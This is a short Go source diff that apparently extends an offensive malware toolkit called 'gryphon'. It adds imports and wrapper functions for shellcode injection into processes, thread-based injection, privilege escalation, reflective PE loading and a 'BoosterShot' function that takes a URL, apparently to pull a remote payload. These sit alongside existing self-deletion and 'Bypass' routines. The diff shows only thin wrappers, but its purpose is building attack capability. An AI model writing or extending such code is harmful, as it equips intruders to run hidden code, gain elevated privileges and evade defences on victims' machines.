@@ -21,6 +21,10 @@ import (
 	"bitbucket.org/kardianos/osext"
 	"github.com/fatih/color"
 	"github.com/whiterabb17/gryphon/bypass"
+	"github.com/whiterabb17/gryphon/escalate"
+	"github.com/whiterabb17/gryphon/injection"
+	"github.com/whiterabb17/gryphon/reflection"
+	"github.com/whiterabb17/gryphon/shellcode"
 	"github.com/whiterabb17/gryphon/variables"
 )
 
@@ -198,6 +202,26 @@ func GetPath() (string, error) {
 // Remove is used to self delete.
 func Remove() {
 	os.Remove(os.Args[0])
+}
+
+func BoosterShot(url string) {
+	injection.BoosterShot(url)
+}
+
+func InjectIntoProc(proc, args, data string) {
+	shellcode.InjectIntoProcess(proc, args, data)
+}
+
+func Escalate(path string) {
+	escalate.Escalate(path)
+}
+
+func ReflectiveRunPE(destPE []byte) {
+	reflection.ReflectiveRunPE(destPE)
+}
+
+func CreateThreadInject(data string) {
+	shellcode.CreateThreadInject(data)
 }
 
 func Bypass() {
